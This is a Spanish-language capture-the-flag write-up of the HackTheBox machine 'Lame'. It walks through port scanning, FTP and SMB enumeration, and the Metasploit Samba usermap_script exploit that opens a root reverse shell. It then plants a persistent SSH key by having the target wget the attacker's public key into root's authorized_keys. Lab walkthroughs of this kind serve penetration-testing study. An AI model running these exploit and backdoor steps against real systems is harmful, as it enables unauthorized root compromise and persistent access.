---
title: "HTB writeup: Lame"
date: 2019-11-05T07:53:51-06:00
description: "Lame, una de las primeras maquinas creadas en HTB y retirada hace bastante tiempo."
tags: ["hackthebox", "htb", "legacy", "pentesting"]
categories: ["htb", "pentesting"]
---

Remember, Remember the 5 of november. Bueno comencé a realizar las maquinas retiradas de hackthebox para prepararme para el OSCP. Recién adquirí mi suscripción, esta fue la primera maquina en caer. Un resumen rápido es enumerar y enumerar. Cuando un camino se cierra, otro se abre.
<!--more-->

# Machine info
La información que tenemos de la máquina es:

| Name | Maker | OS  | IP Address |
| ---- | ----- | --- | ---------- |
| ![lame image](https://www.hackthebox.eu/storage/avatars/fb2d9f98400e3c802a0d7145e125c4ff_thumb.png) [lame](https://www.hackthebox.eu/home/machines/profile/1) | [ch4p](https://www.hackthebox.eu/home/users/profile/1) | Linux | 10.10.10.3 |

Su tarjeta de presentación es:

![cardinfo](/img/htb-lame/cardinfo.png)


# Port Scanning

Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:

```text
root@laptop:~# nmap -sS -n --open -v -p- 10.10.10.3
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-05 08:05 CST
Initiating Ping Scan at 08:05
Scanning 10.10.10.3 [4 ports]
Completed Ping Scan at 08:05, 0.12s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 08:05
Scanning 10.10.10.3 [65535 ports]
Discovered open port 445/tcp on 10.10.10.3
Discovered open port 21/tcp on 10.10.10.3
Discovered open port 22/tcp on 10.10.10.3
Discovered open port 139/tcp on 10.10.10.3
Discovered open port 3632/tcp on 10.10.10.3
Completed SYN Stealth Scan at 08:09, 233.00s elapsed (65535 total ports)
Nmap scan report for 10.10.10.3
Host is up (0.087s latency).
Not shown: 65530 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 233.25 seconds
           Raw packets sent: 131240 (5.775MB) | Rcvd: 176 (7.728KB)
```

- `-sS` para escaneo TCP vía SYN
- `-p-` para todos los puertos TCP
- `--open` para que solo me muestre resultados de puertos abiertos
- `-n` para no ejecutar resoluciones
- `-v` para modo *verboso*

Como en otras ocasiones, verificamos los puertos abiertos con `masscan`:

```text
root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.3

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-10-06 00:30:56 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 139/tcp on 10.10.10.3
Discovered open port 3632/tcp on 10.10.10.3
Discovered open port 445/tcp on 10.10.10.3
Discovered open port 21/tcp on 10.10.10.3
```

- `-e tun0` para ejecutarlo nada mas en la interface tun0
- `-p0-65535,U:0-65535` TODOS los puertos (TCP y UDP)
- `--rate 500` para mandar 500pps y no sobre cargar la VPN ):

Como podemos ver los puertos son los mismos, por lo que iniciamos por identificar los servicios nuevamente con `nmap`.

# Services Identification

Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):

```text
root@laptop:~# nmap -sV -sC -p139,445,3632,21 -v -n 10.10.10.3
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-05 19:36 CDT
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:36
Completed NSE at 19:36, 0.00s elapsed
Initiating NSE at 19:36
Completed NSE at 19:36, 0.00s elapsed
Initiating NSE at 19:36
Completed NSE at 19:36, 0.00s elapsed
Initiating Ping Scan at 19:36
Scanning 10.10.10.3 [4 ports]
Completed Ping Scan at 19:36, 0.43s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:36
Scanning 10.10.10.3 [4 ports]
Discovered open port 445/tcp on 10.10.10.3
Discovered open port 139/tcp on 10.10.10.3
Discovered open port 21/tcp on 10.10.10.3
Discovered open port 3632/tcp on 10.10.10.3
Completed SYN Stealth Scan at 19:36, 0.18s elapsed (4 total ports)
Initiating Service scan at 19:36
Scanning 4 services on 10.10.10.3
Completed Service scan at 19:36, 11.94s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.10.3.
Initiating NSE at 19:36
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 19:37, 40.06s elapsed
Initiating NSE at 19:37
Completed NSE at 19:37, 0.80s elapsed
Initiating NSE at 19:37
Completed NSE at 19:37, 0.00s elapsed
Nmap scan report for 10.10.10.3
Host is up (0.28s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.23
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OS: Unix

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
|_smb-security-mode: ERROR: Script execution failed (use -d to debug)
|_smb2-time: Protocol negotiation failed (SMB2)

NSE: Script Post-scanning.
Initiating NSE at 19:37
Completed NSE at 19:37, 0.00s elapsed
Initiating NSE at 19:37
Completed NSE at 19:37, 0.00s elapsed
Initiating NSE at 19:37
Completed NSE at 19:37, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.09 seconds
           Raw packets sent: 8 (328B) | Rcvd: 5 (204B)
```

- `-sC` para que ejecute los scripts safe-discovery de nse
- `-sV` para que me traiga el banner del puerto
- `-p139,445,3632,21` para unicamente los puertos descubiertos previamente
- `-n` para no ejecutar resoluciones

Con esta información concluimos que tenemos varios servicios abiertos, que tenemos una maquina Linux como target, con servicios de compartición de archivos tales como FTP y SMB. Verifiquemos que tanto podemos obtener del servicio de FTP.

# FTP Service

Como en otras maquinas, en lugar de entrar y verificar carpeta por carpeta, creare un espejo de lo entregado por el servicio:

```
xbytemx@laptop:~/htb/lame$ wget --mirror ftp://10.10.10.3
--2019-10-05 19:39:09--  ftp://10.10.10.3/
           => “10.10.10.3/.listing”
Conectando con 10.10.10.3:21... conectado.
Identificándose como anonymous ... ¡Dentro!
==> SYST ... hecho.   ==> PWD ... hecho.
==> TYPE I ... hecho.  ==> no se necesita CWD.
==> PASV ... hecho.   ==> LIST ... hecho.

10.10.10.3/.listing                                 [ <=>                                                                                                  ]     119  --.-KB/s    en 0.001s

2019-10-05 19:39:11 (180 KB/s) - “10.10.10.3/.listing” guardado [119]

--2019-10-05 19:39:11--  ftp://10.10.10.3/
           => “10.10.10.3/index.html”
==> no se requiere CWD.
==> SIZE  ... hecho.

==> PASV ... hecho.   ==> RETR  ...
No existe tal fichero “”.

ACABADO --2019-10-05 19:39:12--
Tiempo total de reloj: 3.0s
Descargados: 1 ficheros, 119 en 0.001s (180 KB/s)
```

Al no encontrar nada relevante, me conecte usando un cliente de FTP y verifique:

```
xbytemx@laptop:~/htb/lame$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:xbytemx): anonymous
331 Please specify the password.
Password:
+230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> bye
221 Goodbye.
xbytemx@laptop:~/htb/lame$
```

No pudimos obtener mas información dentro del servicio, pero nos quedamos con la información de que tenemos acceso de manera anónima, el servidor es **vsFTPd** y que la versión del servidor es "2.3.4".

# SMB service

Ahora, exploremos el servicio de SMB utilizando `smbclient` de impacket:

```
(impacket-a2aNp99x) xbytemx@laptop:~/git/impacket/examples$ python smbclient.py 10.10.10.3
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

Type help for list of commands
# shares
print$
tmp
opt
IPC$
ADMIN$
# use tmp
# ls
drw-rw-rw-          0  Sat Oct  5 19:21:28 2019 .
drw-rw-rw-          0  Sun May 20 13:36:11 2012 ..
drw-rw-rw-          0  Sat Oct  5 19:15:38 2019 .ICE-unix
-rw-rw-rw-          0  Sat Oct  5 19:16:41 2019 5139.jsvc_up
drw-rw-rw-          0  Sat Oct  5 19:16:03 2019 .X11-unix
-rw-rw-rw-         11  Sat Oct  5 19:16:03 2019 .X0-lock
# use opt
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
# use print$
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
# use IPC$
[-] SMB SessionError: STATUS_NETWORK_ACCESS_DENIED(Network access is denied.)
# use ADMIN$
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
# exit
```

Pudimos enumerar los recursos compartidos, pero no encontramos nada relevante que nos permita obtener mas información sobre la maquina. Busquemos exploits en el FTP.

# Searchploit: FTP

Utilizando `searchsploit`, encontraremos que la versión 2.3.4 de vsFTPd tiene una vulnerabilidad conocida, un backdoor de smile face:

```
xbytemx@laptop:~/git/exploit-database$ ./searchsploit ftp 2.3.4
-------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------
 Exploit Title                                                                                                                        |  Path
                                                                                                                                      | (/home/xbytemx/git/exploit-database//)
-------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                | exploits/unix/remote/17491.rb
-------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------
Shellcodes: No Result
```

Como podemos ver, la vulnerabilidad es tan popular que tiene su propio exploit en Metasploit.

Utilizando `metasploit-framework`, tratemos de explotar la vulnerabilidad:

```
msf5 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


msf5 > use 0
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exit
```

Como pudimos observar, aunque el exploit se ejecuto correctamente, no se reconecto al backdoor. Sin detenernos demasiado tiempo en explotar una vulnerabilidad, pasemos a enumerar mas el servicio de SMB.

# SMB version enum

En la etapa anterior no pudimos identificar la versión exacta de SMB corriendo, solo lo que de manera general nos entrego `nmap`. Pero si ejecutamos smbclient y nos conectamos de manera anónima, podemos obtener un poco de información al respecto.

> Nota, esto varia mucho entre versiones de SMB, por lo que es importante seguir enumerando con diferentes herramientas o enumerar con la herramienta correcta, la version correcta.

```
(impacket-a2aNp99x) xbytemx@laptop:~/git/impacket/examples$ smbclient -L 10.10.10.3
Unable to initialize messaging context
Enter WORKGROUP\xbytemx's password:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            LAME
```

Ok, `smbclient` nos devuelve que la versión de SMB es la 3.0.20~Debian. Realicemos el paso que hicimos con FTP dentro de `searchsploit`.

# Searchploit: SMB

Utilizando `searchsploit`, identificamos la siguiente vulnerabilidad:

```
xbytemx@laptop:~/git/exploit-database$ ./searchsploit Samba 3.0.20
-------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------
 Exploit Title                                                                                                                        |  Path
                                                                                                                                      | (/home/xbytemx/git/exploit-database//)
-------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                      | exploits/unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                                 | exploits/linux/remote/7701.txt
-------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------
Shellcodes: No Result
```

Nuevamente, `metasploit-framework` tiene escrito ya el exploit dentro del framework, así que pasemos a utilizarlo.

# Command Execution

Después de revisar este [exploit](https://github.com/amriunix/CVE-2007-2447), observaremos que su funcionamiento se basa en:

> The root cause is passing unfiltered user input provided via MS-RPC calls to /bin/sh when invoking non-default "username map script" configuration option in smb.conf, so no authentication is needed to exploit this vulnerability.

Básicamente cuando le pasamos el usuario durante la conexión, el nombre del usuario es usado para ejecutar comandos sobre sh, por lo que si mandamos expresiones de sustitución o evaluación script de sh, podemos ejecutar remotamente código que nos permita llamar a una conexión en reversa. Esto es lo que hace MSF tras bambalinas:

```
msf5 > use exploit/multi/samba/usermap_script
msf5 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   139              yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf5 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP double handler on 10.10.14.23:4444
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 11hUeTXzLVKsyhQx;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "11hUeTXzLVKsyhQx\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.23:4444 -> 10.10.10.3:33932) at 2019-10-05 20:00:32 -0500


id
uid=0(root) gid=0(root)
```

Perfecto, hemos obtenido una reverse shell como root. Ya tenemos acceso a todo el filesystem, pero que pasa si se parchea la vulnerabilidad o simplemente se cierra el servicio? Pues nos quedaríamos sin acceso y mas aun porque tenemos una reverse shell. Pasemos a la siguiente etapa.

# Get SSH Access

Aplicando la vieja confiable, agregamos nuestro certificado público en las llaves autorizadas de ssh para el usuario root. Esto es posible porque tenemos una shell remota y porque la configuración de ssh permite que root pueda ingresar.

Comenzamos por iniciar un web server para compartir la llave:

```
xbytemx@laptop:~/.ssh$ python3 -m http.server 4001
Serving HTTP on 0.0.0.0 port 4001 (http://0.0.0.0:4001/) ...
10.10.10.3 - - [05/Nov/2019 08:24:47] "GET /id_rsa.pub HTTP/1.0" 200 -
^C
Keyboard interrupt received, exiting.
```

Mientras tanto, en el reverse shell:

```
wget http://10.10.14.2:4001/id_rsa.pub -O /root/.ssh/authorized_keys
--09:24:58--  http://10.10.14.2:4001/id_rsa.pub
           => `/root/.ssh/authorized_keys'
Connecting to 10.10.14.2:4001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 568 [application/octet-stream]

    0K                                                       100%  176.39 MB/s

09:24:58 (176.39 MB/s) - `/root/.ssh/authorized_keys' saved [568/568]
```

Perfecto, ya agregamos nuestra llave, ahora solo falta validar:

```
xbytemx@laptop:~/.ssh$ ssh -i id_rsa root@10.10.10.3
Last login: Tue Nov  5 09:06:12 2019 from :0.0
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have new mail.
root@lame:~#
```

Boom, tenemos shell como root.

# user.txt

Ya desde esta shell, podemos tomar nuestras flags.

```
root@lame:~# cat /home/makis/user.txt
```

# root.txt

Tomamos la flag de root:

```
root@lame:~# cat /root/root.txt
```

... And we got root and user flag.

---

Gracias por llegar hasta aquí, hasta la próxima!
